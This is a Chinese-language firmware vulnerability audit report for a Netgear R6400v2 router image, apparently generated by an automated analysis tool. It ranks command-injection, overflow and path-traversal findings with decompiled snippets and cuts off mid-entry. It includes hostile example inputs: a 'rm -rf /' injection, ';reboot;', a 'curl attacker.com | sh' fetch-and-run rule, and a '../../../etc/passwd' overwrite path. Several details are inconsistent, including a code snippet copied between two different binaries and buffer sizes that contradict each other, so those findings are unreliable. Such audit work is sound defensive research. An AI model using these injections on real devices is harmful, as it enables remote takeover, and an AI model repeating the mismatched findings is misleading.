# R6400v2-V1.0.2.46_1.0.36 高优先级: 17 中优先级: 27 低优先级: 16

## 优先级评分模型

**计算公式:** `PriorityScore = (0.5 * risk_level) + (0.3 * confidence) + (0.2 * trigger_possibility)`

**分层策略:**
- **高优先级:** `PriorityScore >= 8.5`
- **中优先级:** `7.0 <= PriorityScore < 8.5`
- **低优先级:** `PriorityScore < 7.0`

---

## 高优先级发现

### command_execution-bd-RCE_8083

- **文件路径:** `sbin/bd`
- **位置:** `bd:0xb1cc FUN_0000b1cc`
- **类型:** command_execution
- **综合优先级分数:** **9.65**
- **风险等级:** 10.0
- **置信度:** 9.5
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 程序在8083端口创建监听服务，接受连接后直接执行QUERY_STRING环境变量内容。关键漏洞点：1) 通过getenv('QUERY_STRING')获取外部输入 2) 未经任何过滤/验证直接传递给system()执行 3) 攻击者通过HTTP请求设置QUERY_STRING可注入任意命令。触发条件：网络可达8083端口+发送含恶意QUERY_STRING的请求。实际影响：远程代码执行(RCE)，风险等级极高。
- **代码片段:**
  ```
  pcVar8 = getenv("QUERY_STRING");
  if (pcVar8 != (char *)0x0) {
      system(pcVar8);
  }
  ```
- **关键词:** QUERY_STRING, system, getenv, FUN_0000b1cc, socket, bind, accept
- **备注:** 需验证：1) bd是否开机自启 2) 8083端口暴露情况 3) 关联HTTP服务处理流程。后续建议：分析/etc/init.d/相关启动脚本。注意：知识库中已存在www/cgi-bin/genie.cgi使用QUERY_STRING的发现（风险等级7.5），但位于不同文件且仅涉及认证绕过，未形成直接关联。

---
### command_injection-acos_service-lan_ipaddr

- **文件路径:** `sbin/acos_service`
- **位置:** `acos_service:main @ 0xd054`
- **类型:** nvram_get,command_execution
- **综合优先级分数:** **9.55**
- **风险等级:** 9.8
- **置信度:** 9.5
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危命令注入漏洞：当程序以'start'参数执行且NVRAM配置'afpd_enable=1'时，未经验证的NVRAM值'lan_ipaddr'通过sprintf()拼接到系统命令并直接执行system()。攻击者通过设置污染值(如'127.0.0.1;rm -rf /')可注入任意命令。触发条件：1) 攻击者通过HTTP接口等写入污染数据 2) 服务执行网络初始化流程。无输入过滤或边界检查，导致root权限任意命令执行。
- **代码片段:**
  ```
  uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);
  sym.imp.sprintf(iVar24 + -0x1e8,*0xccfc,*0xccf8,uVar11);
  sym.imp.system(iVar24 + -0x1e8);
  ```
- **关键词:** lan_ipaddr, afpd_enable, acosNvramConfig_get, system, sprintf, *0xcd64, *0xccfc
- **备注:** 完整攻击链已验证：HTTP接口→NVRAM设置→命令执行。与发现3形成利用链

---
### attack_chain-http_to_command

- **文件路径:** `sbin/acos_service`
- **位置:** `unknown`
- **类型:** network_input,command_execution
- **综合优先级分数:** **9.25**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 攻击链可行性验证：确认从HTTP接口到命令注入的完整路径：1) 攻击者设置污染NVRAM(lan_ipaddr) 2) acos_service启动读取污染值 3) 值直接拼接到system()命令 4) 注入命令以root执行。关键触发点位于main()网络初始化段，利用成功率高。
- **关键词:** HTTP_interface, NVRAM_set, acosNvramConfig_get, system, command_injection
- **备注:** 与发现1形成完整利用链。建议后续分析/cgi-bin/下的Web组件验证NVRAM写入接口

---
### network_input-pppd_PAP_auth-stack_overflow

- **文件路径:** `sbin/pppd`
- **位置:** `sbin/pppd: sym.upap_authwithpeer (偏移待定)`
- **类型:** network_input
- **综合优先级分数:** **9.15**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** PAP认证栈缓冲区溢出漏洞（CVE待分配）：攻击者通过PPP连接发送超长PAP密码时触发。漏洞位于sym.upap_authwithpeer函数：1) 密码长度(param_3)未经验证 2) 通过memcpy复制到24字节固定栈缓冲区 3) 用户名+密码+分隔符总长超过15字节时覆盖返回地址。pppd以root权限运行，成功利用可导致设备完全控制。
- **代码片段:**
  ```
  memcpy(puVar9 + iVar3 + 1, puVar5[3], puVar5[4]); // puVar5[3]=密码指针, puVar5[4]=密码长度
  ```
- **关键词:** sym.upap_authwithpeer, param_3, auStack_18, memcpy, PAP authentication, puVar5[4]
- **备注:** 需后续验证：1) 精确溢出偏移 2) ASLR/PIE绕过可行性 3) 关联配置文件/etc/ppp/pap-secrets的输入过滤机制

---
### ipc-dbus-session-policy

- **文件路径:** `etc/session.conf`
- **位置:** `etc/session.conf`
- **类型:** ipc
- **综合优先级分数:** **9.05**
- **风险等级:** 8.5
- **置信度:** 10.0
- **触发可能性:** 9.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** D-Bus会话配置存在全局宽松策略：1) 允许所有进程监听总线消息(eavesdrop=true) 2) 允许向任意目标发送消息(send_destination="*") 3) 设置1GB超大消息限制。攻击者可通过恶意进程监听敏感通信（如凭证交换）或注入伪造消息（如服务控制指令），结合其他漏洞可形成完整攻击链。该配置无需特定触发条件，系统启动即生效。
- **代码片段:**
  ```
  <policy context="default">
    <allow send_destination="*" eavesdrop="true"/>
    <allow eavesdrop="true"/>
  </policy>
  <limit name="max_message_size">1000000000</limit>
  ```
- **关键词:** eavesdrop, send_destination, max_message_size, session.d, session-local.conf, <policy>, <limit>
- **备注:** 需检查session.d目录是否覆盖此策略。该配置显著扩大攻击面，建议作为IPC攻击链关键节点追踪。

---
### command_injection-rc-fcn13974_nvram_eval

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x13c40 (fcn.00013974)`
- **类型:** nvram_get
- **综合优先级分数:** **9.05**
- **风险等级:** 9.0
- **置信度:** 9.5
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危命令注入链（NVRAM→_eval）：在fcn.00013974函数中，攻击者控制的NVRAM变量（如*0x14910对应的键）通过snprintf动态构建命令参数，最终由_eval执行。具体路径：不可信输入(NVRAM)→未过滤参数→动态命令构建→系统命令执行。触发条件：网络接口初始化时自动触发该代码段。
- **代码片段:**
  ```
  pcVar2 = sym.imp.nvram_get(*0x14910);
  sym.imp.snprintf(..., *0x14958, ...);
  sym.imp._eval(...);
  ```
- **关键词:** fcn.00013974, _eval, nvram_get, snprintf, *0x14910, *0x14958
- **备注:** 完整攻击链需配合HTTP接口分析NVRAM写入点；关联知识库备注：需验证NVRAM写入接口的安全性

---
### nvram_get-ubdcmd-detect

- **文件路径:** `sbin/ubdcmd`
- **位置:** `ubdcmd:0x91cc,0x93d4,0x8d80`
- **类型:** nvram_get
- **综合优先级分数:** **9.0**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 9.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** NVRAM污染攻击链：通过HTTP接口污染wan_ipaddr/wan_gateway/pppoe_mtu触发高危漏洞。触发步骤：1) 设置恶意NVRAM值 2) 执行`ubdcmd detect`。具体表现：1) pppoe_mtu<50 → 0x91cc处subls整数下溢 2) wan_ipaddr污染全局结构体 → fcn.00008d80越界读取 3) wan_gateway非法IP → inet_addr失败 → 0x8d80无限循环。安全影响：拒绝服务/信息泄露/逻辑绕过，成功概率>80%。边界检查：acosNvramConfig_get返回值直接使用，无长度/内容验证。
- **代码片段:**
  ```
  ldr r0, =pppoe_mtu
  bl acosNvramConfig_get
  bl atoi
  cmp r0, #50
  subls r0, r0, #1  ; 整数下溢触发点
  ```
- **关键词:** acosNvramConfig_get, pppoe_mtu, wan_ipaddr, wan_gateway, detect, fcn.00008d80, subls, inet_addr
- **备注:** 关键污染键：wan_ipaddr(2链)/wan_gateway(2链)/pppoe_mtu(1链)；关联acosNvramConfig_get（多链共用）

---
### cmd_injection-frendly_name-system

- **文件路径:** `sbin/system`
- **位置:** `sbin/system:0 (main) 0xcd24`
- **类型:** command_execution
- **综合优先级分数:** **8.95**
- **风险等级:** 9.0
- **置信度:** 9.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危命令注入漏洞：程序使用'sprintf(buffer, "%s %s", "mkdir -p", nvram_get("friendly_name"))'构建命令，其中'friendly_name'值未经任何过滤直接拼接。触发条件：攻击者通过其他接口（如Web API）设置恶意NVRAM值（如';reboot;'），当系统执行初始化流程时触发。安全影响：以root权限执行任意命令，成功利用概率高。
- **代码片段:**
  ```
  uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);
  sym.imp.sprintf(iVar24 + -0x1e8, *0xccfc, *0xccf8, uVar11);
  sym.imp.system(iVar24 + -0x1e8);
  ```
- **关键词:** friendly_name, acosNvramConfig_get, sprintf, system, mkdir -p
- **备注:** 关联攻击路径：Web接口设置friendly_name → NVRAM存储 → system()执行

---
### command_injection-hotplug2-rules_manipulation

- **文件路径:** `sbin/hotplug2`
- **位置:** `sbin/hotplug2:0xa8d0 fcn.0000a8d0`
- **类型:** command_execution
- **综合优先级分数:** **8.9**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 8.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** hotplug2规则文件驱动的命令注入漏洞。触发条件：1) 攻击者篡改/etc/hotplug2.rules文件内容 2) 规则包含SYSTEM_ACTION且命令含环境变量占位符（如$VAR）。漏洞原理：a) 函数fcn.0000a73c执行环境变量替换时未过滤内容 b) 替换结果直接传入system()执行。攻击者可构造恶意规则（如PATH=/tmp;curl${IFS}attacker.com | sh），当热插拔事件触发规则时实现RCE。攻击面：网络接口（若www用户可写规则文件）或物理接口（USB热插拔）。
- **代码片段:**
  ```
  uVar9 = fcn.0000a73c(uVar5,param_1);
  iVar11 = sym.imp.system();
  ```
- **关键词:** fcn.0000a73c, system, SYSTEM_ACTION, /etc/hotplug2.rules
- **备注:** 需验证规则文件权限：若www用户可写/etc/hotplug2.rules则形成完整WEB→配置篡改→RCE链。关联知识库备注：'需验证配置文件内容是否包含用户可控参数'

---
### command_injection-rc-0x0000efd0

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x0000efd0`
- **类型:** command_execution
- **综合优先级分数:** **8.85**
- **风险等级:** 9.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危命令注入漏洞：rc中函数fcn.0000ed80(0x0000efd0)通过system执行全局指针*0xfd88/*0xfd8c指向的命令。触发条件：当nvram_get(*0xfd80)返回空或strcmp(*0xfd84)不匹配时。关键缺陷：命令字符串完全由NVRAM值控制且未经验证，攻击者可通过HTTP接口/NVRAM设置污染输入，实现任意命令执行。
- **代码片段:**
  ```
  if ((iVar2 == 0) || (iVar2 = sym.imp.strcmp(iVar2,*0xfd84), iVar2 != 0)) {
      sym.imp.system(*0xfd88);
      sym.imp.system(*0xfd8c);
  }
  ```
- **关键词:** system, *0xfd88, *0xfd8c, nvram_get, strcmp, *0xfd80, *0xfd84
- **备注:** 完整攻击路径：HTTP参数→NVRAM设置接口→rc启动时触发

---
### command_injection-rc-lan_ifnames_eval

- **文件路径:** `sbin/rc`
- **位置:** `sbin/rc:0x10c98 (network_init)`
- **类型:** nvram_get
- **综合优先级分数:** **8.75**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** lan_ifnames命令注入漏洞：在0x10c98处，nvram_get("lan_ifnames")返回值被分割后用于构造_eval命令参数。虽使用strspn/strcspn分割，但未对令牌内容过滤。攻击者通过污染lan_ifnames可注入恶意命令。触发条件：系统网络配置初始化时执行。
- **关键词:** lan_ifnames, nvram_get, _eval, strspn, strcspn

---
### cmd_injection-nvram_leafp2p_sys_prefix

- **文件路径:** `etc/init.d/leafp2p.sh`
- **位置:** `etc/init.d/leafp2p.sh:5-6,8,12 (start)`
- **类型:** nvram_get
- **综合优先级分数:** **8.7**
- **风险等级:** 9.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 攻击者通过污染NVRAM的'leafp2p_sys_prefix'值可注入恶意路径：1) SYS_PREFIX直接用于构建脚本路径(${SYS_PREFIX}/bin/checkleafnets.sh) 2) PATH被修改为${SYS_PREFIX}/bin优先。触发条件：a) 攻击者能写入NVRAM(如通过Web漏洞) b) 执行/etc/init.d/leafp2p.sh start。边界检查：无路径验证或过滤。实际影响：结合后台执行机制(${CHECK_LEAFNETS} &)，可导致任意命令执行。利用方式：在恶意路径放置伪造的checkleafnets.sh实现权限提升。
- **代码片段:**
  ```
  SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)
  PATH=${SYS_PREFIX}/bin:...
  ${CHECK_LEAFNETS} &
  ```
- **关键词:** leafp2p_sys_prefix, SYS_PREFIX, CHECK_LEAFNETS, checkleafnets.sh, nvram get, PATH, start()
- **备注:** 需验证：1) NVRAM写入接口的安全性 2) checkleafnets.sh的实际实现。建议后续分析Web接口的NVRAM设置功能。

---
### stack_overflow-acos_service-nvram_ce30

- **文件路径:** `sbin/acos_service`
- **位置:** `unknown`
- **类型:** nvram_get
- **综合优先级分数:** **8.65**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 高危栈溢出漏洞（双重）：1) NVRAM项'*0xce30'通过sprintf(4字节缓冲区,"%d",value)写入，整数转换后可覆盖返回地址；2) NVRAM值'*0xca9c'通过strcpy(40字节缓冲区,value)复制。触发条件：控制相关NVRAM项并触发服务重启。完全缺失边界检查，可实现任意代码执行。
- **关键词:** sprintf, strcpy, acosNvramConfig_get, atoi, *0xce30, *0xca9c, auStack_1ce8
- **备注:** 需通过固件符号表确认*0xce30和*0xca9c对应的实际NVRAM配置项名称。与发现1共享acosNvramConfig_get

---
### curl-o-parameter-path-traversal

- **文件路径:** `sbin/curl`
- **位置:** `getparameter:0x0000ff9c, operate_do:0x00011a5c`
- **类型:** network_input
- **综合优先级分数:** **8.55**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** curl的-o参数处理存在路径遍历漏洞：在getparameter函数(case 0x4c)中，用户输入的路径未经任何过滤直接传递给fopen64()。攻击者可构造恶意路径（如'-o ../../../etc/passwd'）实现任意文件覆盖。触发条件：1) 攻击者能控制curl命令行参数 2) curl进程对目标路径有写权限。在固件环境中，若curl被Web后台调用或具有高权限，可导致关键配置文件篡改或权限提升。
- **代码片段:**
  ```
  iVar5 = sym.imp.fopen64(*(puVar22 + -0x1c), *0x1226c); // 直接使用用户输入路径
  ```
- **关键词:** getparameter, case 0x4c, fopen64, operate_do, -o, output, curl
- **备注:** 需结合固件环境验证：a) curl是否被setuid b) 是否有组件传递未过滤的用户输入给curl。常见路径：/usr/bin/curl或/sbin/curl

---
### network_input-ubdcmd-recvmsg

- **文件路径:** `sbin/ubdcmd`
- **位置:** `调用点: 0x8e10,0x8ebc,0x8f40,0x9168,0x9a60`
- **类型:** network_input
- **综合优先级分数:** **8.55**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** recvmsg缓冲区缺陷：接收网络数据时硬编码长度0x420且未验证实际长度。触发条件：发送≠1056字节的特制UDP包。具体表现：1) 5处调用点固定param_2=0x420 2) 实际接收长度未验证 → 短包控制*0x8e70+0x26等内存 3) 长包触发fcn.00008f04栈溢出。安全影响：内存破坏导致RCE（结合auto命令可形成完整链）。边界检查：仅fcn.00008b98有param_2≤0x420检查，未验证recvmsg实际返回值。
- **代码片段:**
  ```
  mov r2, #0x420  ; 硬编码长度
  bl recvmsg
  ldr r3, [sp, #0x400] ; 未验证长度直接偏移访问
  ```
- **关键词:** recvmsg, param_2, 0x420, fcn.00008b98, fcn.00008f04
- **备注:** 需验证UDP端口暴露情况；关联fcn.00008b98（manualset整数溢出）

---
### nvram_pollution-rc-0x0000ed80

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x0000ed80`
- **类型:** nvram_get
- **综合优先级分数:** **8.55**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** NVRAM污染传播路径：fcn.0000ed80包含21处nvram_get调用（如*0xfd54, *0xfd80等），直接影响：1) 分支条件判断(strcmp) 2) 文件写入内容(*0xff08) 3) 命令执行参数(*0xfd88)。关键约束缺失：所有NVRAM值使用点均无长度检查或内容过滤，形成系统级污染入口。
- **关键词:** nvram_get, *0xfd54, *0xfd80, *0xff08, *0xfd88, strcmp

---
### cmd_injection-env_nvram_system-fcn1728c

- **文件路径:** `sbin/system`
- **位置:** `fcn.0001728c (0x16024, 0x15d5c)`
- **类型:** network_input
- **综合优先级分数:** **8.55**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 7.5
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 高危命令注入链：攻击者通过污染环境变量（如HTTP_USER_AGENT）触发NVRAM污染（fcn.0001728c+0x16024）。污染后的NVRAM值在fcn.0001728c+0x15d5c处未经过滤直接拼接到sprintf格式字符串，最终通过system执行。触发条件：1) 网络配置操作时 2) 污染数据包含命令分隔符。边界检查：无输入过滤机制，仅简单修剪空格。可利用性：高（可注入任意命令）
- **代码片段:**
  ```
  iVar7 = sym.imp.getenv(*0x16e84);
  sym.imp.acosNvramConfig_set(*0x16f00,iVar7);
  uVar13 = sym.imp.acosNvramConfig_get(...);
  sym.imp.sprintf(iVar18,*0x15e9c,pcVar10,uVar13);
  sym.imp.system(iVar18);
  ```
- **关键词:** getenv, acosNvramConfig_set, acosNvramConfig_get, sprintf, system, HTTP_USER_AGENT
- **备注:** 完整攻击路径：环境变量污染→NVRAM存储→命令拼接→系统命令执行。建议验证web接口中环境变量设置点。

---

## 中优先级发现

### stack_overflow-rc-fcn0ed80_strcpy

- **文件路径:** `sbin/rc`
- **位置:** `rc:0xee8c (fcn.0000ed80)`
- **类型:** nvram_get
- **综合优先级分数:** **8.45**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 栈溢出风险（NVRAM→strcpy）：在fcn.0000ed80函数0xee8c处，nvram_get()返回值直接通过strcpy复制到固定大小栈缓冲区(puVar10)。攻击者通过设置超长NVRAM值可覆盖返回地址。触发条件：该函数被调用且攻击者控制对应NVRAM键值。
- **代码片段:**
  ```
  uVar3 = sym.imp.nvram_get(*0xfd98);
  sym.imp.strcpy(puVar10, uVar3);
  ```
- **关键词:** strcpy, nvram_get, fcn.0000ed80, puVar10, *0xfd98
- **备注:** 需结合ASLR和栈保护机制评估实际利用难度；关联知识库备注：需验证实际固件中curl响应头长度限制

---
### env-pollution-curl-http-proxy

- **文件路径:** `sbin/curl`
- **位置:** `sbin/curl:0x000113f0 sym.operate_do`
- **类型:** env_get
- **综合优先级分数:** **8.45**
- **风险等级:** 8.5
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.8
- **阶段:** N/A
- **描述:** HTTP_PROXY环境变量污染导致中间人攻击：1) operate_do函数通过curl_getenv读取HTTP_PROXY环境变量值 2) 未经验证直接通过tool_setopt配置代理 3) 攻击者可通过污染环境变量（如通过NVRAM/web接口）强制curl流量经恶意代理。触发条件：a) 固件允许远程设置环境变量 b) 用户执行curl网络请求。实际影响：敏感数据窃取/流量篡改。
- **代码片段:**
  ```
  iVar9 = sym.curl_getenv(*0x12248);
  iVar3 = sym.imp.strdup();
  param_2[0x45] = iVar3;
  ```
- **关键词:** operate_do, curl_getenv, tool_setopt, CURLOPT_PROXY, HTTP_PROXY
- **备注:** 关联知识库ID:curl-o-parameter-path-traversal/curl-T-parameter-arbitrary-read。需验证环境变量设置机制，NVRAM接口可能为污染入口。

---
### exploit-chain-nvram-pollution-leafp2p

- **文件路径:** `etc/init.d/leafp2p.sh`
- **位置:** `etc/init.d/leafp2p.sh:5-12`
- **类型:** nvram_set
- **综合优先级分数:** **8.45**
- **风险等级:** 9.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 确认完整NVRAM污染攻击链：1) 攻击者通过未授权接口（如Web CGI）设置leafp2p_sys_prefix NVRAM值 → 2) 系统启动或服务重启时执行/etc/init.d/leafp2p.sh → 3) 脚本通过`SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)`读取污染值 → 4) 污染值直接注入PATH环境变量和CHECK_LEAFNETS执行路径 → 5) 执行`${CHECK_LEAFNETS} &`时运行攻击者控制的恶意脚本。触发条件：a) NVRAM写入权限 b) 在污染路径部署恶意checkleafnets.sh c) 服务启动事件。
- **代码片段:**
  ```
  SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)
  PATH=${SYS_PREFIX}/bin:...
  CHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh
  start() {
      ${CHECK_LEAFNETS} &
  ```
- **关键词:** leafp2p_sys_prefix, nvram get, SYS_PREFIX, PATH, CHECK_LEAFNETS, checkleafnets.sh, start()
- **备注:** 关键未验证点：1) NVRAM写入接口具体位置 2) checkleafnets.sh实现细节。工具限制：无法验证/usr/bin/checkleafnets.sh内容，未定位NVRAM写入点。建议：优先分析/www/cgi-bin下NVRAM操作CGI脚本，动态跟踪leafp2p_sys_prefix调用链。

---
### attack_chain-hotplug_hardware_to_rce

- **文件路径:** `sbin/hotplug`
- **位置:** `关联路径: sbin/hotplug → sbin/hotplug2`
- **类型:** hardware_input
- **综合优先级分数:** **8.35**
- **风险等级:** 9.0
- **置信度:** 7.5
- **触发可能性:** 8.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 热插拔攻击路径关联分析：硬件热插拔事件（如USB插入）可能通过'sbin/hotplug'处理环境变量输入（$ACTION/$DEVPATH），进而触发'sbin/hotplug2'执行/etc/hotplug2.rules规则。规则中的SYSTEM_ACTION命令存在未过滤环境变量占位符（如$VAR），攻击者可通过篡改规则文件实现RCE。完整攻击链：硬件事件 → hotplug环境变量输入 → hotplug2规则解析 → 命令注入。关键约束：1) 需验证规则文件权限（www用户是否可写）；2) 需确认热插拔事件是否传递环境变量至hotplug2
- **关键词:** hotplug, hotplug2, ACTION, DEVPATH, SYSTEM_ACTION, /etc/hotplug2.rules
- **备注:** 关联知识库记录：1) sbin/hotplug分析失败（文件不可读）2) sbin/hotplug2命令注入漏洞。需人工验证：1) /etc/hotplug2.rules文件权限 2) 热插拔事件是否通过环境变量向hotplug2传递输入

---
### network_input-remote-web_exposure

- **文件路径:** `etc/init.d/remote.sh`
- **位置:** `etc/init.d/remote.sh:12-19`
- **类型:** network_input
- **综合优先级分数:** **8.2**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 脚本创建符号链接将/opt/remote/plugin/remote/下的文件暴露为Web端点（如/tmp/www/cgi-bin/RMT_invite.cgi）。触发条件：Web服务器配置包含/tmp/www路径时自动启用。外部HTTP请求可直接访问这些端点，未发现输入过滤机制，可能形成从网络输入到CGI执行的完整攻击链。
- **代码片段:**
  ```
  ln -s /opt/remote/plugin/remote/RMT_invite.cgi /tmp/www/cgi-bin/RMT_invite.cgi
  ln -s /opt/remote/plugin/remote/func.sh /tmp/www/cgi-bin/func.sh
  ```
- **关键词:** ln -s, /tmp/www/cgi-bin/RMT_invite.cgi, /tmp/www/pluging/RemoteShare.htm, leafp2p_services
- **备注:** 实际风险取决于：1) Web服务器是否加载/tmp/www 2) RMT_invite.cgi/func.sh是否存在漏洞

---
### heap_overflow-http_request-fcn000087f0

- **文件路径:** `sbin/htmlget`
- **位置:** `/sbin/htmlget: [fcn.000087f0]`
- **类型:** network_input
- **综合优先级分数:** **8.2**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.5
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 在函数fcn.000087f0中，使用sprintf构造HTTP请求时存在堆缓冲区溢出漏洞。缓冲区通过malloc(0x46)分配70字节，硬编码请求模板'GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Linux C 1.0\r\nAccept: */*\r\n\r\n'结合15字节IP地址时产生71字节输出。程序未验证gethostbyname解析的IP地址长度，导致单字节堆溢出。触发条件：攻击者通过DNS欺骗使解析的IPv4地址达15字节（如192.168.100.100）。实际影响：可能破坏堆元数据导致拒绝服务或远程代码执行，具体取决于固件堆分配器（如dlmalloc）和内存布局。
- **代码片段:**
  ```
  iVar4 = sym.imp.malloc(0x46);
  sym.imp.sprintf(iVar4,*0x8acc,*0x8abc,*0x8ad0);
  ```
- **关键词:** sprintf, malloc, gethostbyname, inet_ntop, hostname, fcn.000087f0
- **备注:** 漏洞依赖DNS欺骗触发。需验证固件堆分配器行为（如dlmalloc）评估可利用性。关联文件：libc共享库（堆管理实现）。

---
### network_input-http_header_oob_write-fcn_00009564

- **文件路径:** `www/cgi-bin/genie.cgi`
- **位置:** `genie.cgi:0 (fcn.00009564)`
- **类型:** network_input
- **综合优先级分数:** **8.1**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** HTTP响应头越界写漏洞：攻击者控制恶意服务器返回≥2048字节响应头时触发。漏洞位于fcn.00009564的响应头处理逻辑：strncpy复制后手动添加空字符，未验证目标缓冲区边界。导致单个空字节(0x00)越界写入栈内存。触发条件：设备向攻击者控制服务器发起HTTP请求。实际影响：可能破坏栈结构导致程序崩溃或任意代码执行（需特定栈布局）。
- **关键词:** fcn.00009564, strncpy, X-Error-Code, X-Error-Message, fp-0x58, var_24h
- **备注:** 需验证实际固件中curl响应头长度限制及具体架构栈布局

---
### symlink_risk-RMT_invite

- **文件路径:** `sbin/system`
- **位置:** `etc/init.d/remote.sh:12 (script) 0x0`
- **类型:** file_write
- **综合优先级分数:** **8.1**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 符号链接安全风险：在/etc/init.d/remote.sh中使用'ln -s'创建CGI脚本链接时未验证目标路径。触发条件：攻击者预创建恶意符号链接。安全影响：当Web服务器访问/tmp/www/cgi-bin/RMT_invite.cgi时可能导致任意代码执行。
- **代码片段:**
  ```
  ln -s /opt/remote/plugin/remote/RMT_invite.cgi /tmp/www/cgi-bin/RMT_invite.cgi
  ```
- **关键词:** ln, /tmp/www/cgi-bin/RMT_invite.cgi, leafp2p_services, remote.sh
- **备注:** 需结合leafp2p_services验证实际调用链

---
### configuration_load-readydropd-external_usb_admin_chain

- **文件路径:** `www/cgi-bin/readydropd.conf`
- **位置:** `www/cgi-bin/readydropd.conf`
- **类型:** configuration_load
- **综合优先级分数:** **8.1**
- **风险等级:** 8.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 配置指定外部USB挂载路径作为home_dir(/tmp/mnt/usb0/part1)，当恶意USB设备接入时，攻击者可通过文件植入或路径遍历影响服务行为。结合httpd_user=admin的高权限，可能形成'外部介质输入→路径遍历→权限提升'攻击链。触发条件：插入恶意USB设备并诱导服务访问特定路径
- **代码片段:**
  ```
  home_dir = /tmp/mnt/usb0/part1
  httpd_user = admin
  ```
- **关键词:** home_dir, /tmp/mnt/usb0/part1, httpd_user, admin
- **备注:** 需验证readydropd主程序对home_dir的处理逻辑（建议分析www/cgi-bin/readydropd二进制文件）

---
### network_input-QUERY_STRING_auth_bypass-fcn_000093e4

- **文件路径:** `www/cgi-bin/genie.cgi`
- **位置:** `genie.cgi:0x14e (fcn.00009ef8)`
- **类型:** network_input
- **综合优先级分数:** **8.05**
- **风险等级:** 7.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** QUERY_STRING未验证传递风险：通过getenv("QUERY_STRING")直接获取并传递给令牌验证函数(fcn.000093e4)。攻击者可操纵QUERY_STRING值尝试绕过访问控制。触发条件：发送包含QUERY_STRING参数的HTTP请求。实际影响：可能绕过安全验证机制获取未授权访问。
- **关键词:** QUERY_STRING, getenv, fcn.000093e4, param_1
- **备注:** 需分析fcn.000093e4的令牌验证实现是否存在逻辑漏洞

---
### command_execution-ubdcmd-manualset

- **文件路径:** `sbin/ubdcmd`
- **位置:** `ubdcmd:0x99e4,0x99f0,0x9a04`
- **类型:** command_execution
- **综合优先级分数:** **8.05**
- **风险等级:** 7.5
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** manualset命令注入链：通过命令行参数触发整数溢出和IP验证绕过。触发条件：执行`ubdcmd manualset <超大整数> <畸形IP>`。具体表现：1) argv[2]/argv[3]未经边界检查直接atoi转换 → 0x9a60处fcn.00008b98整数溢出 2) argv[4]绕过isValidNetworkAddr验证 → 静默使用默认IP。安全影响：网络配置逻辑破坏，可导致访问控制绕过。约束检查：参数数量验证存在（argc≥5），但内容/边界无校验。
- **代码片段:**
  ```
  mov r0, [r4, #8]  ; argv[2]
  bl atoi
  mov r0, [r4, #12] ; argv[3]
  bl atoi
  mov r0, [r4, #16] ; argv[4]
  bl isValidNetworkAddr
  ```
- **关键词:** manualset, argv[2], argv[3], argv[4], atoi, isValidNetworkAddr, fcn.00008b98
- **备注:** 需结合web接口验证manualset调用频率；关联fcn.00008b98（recvmsg缓冲区检查）

---
### command_injection-hotplug2-env_pollution

- **文件路径:** `sbin/hotplug2`
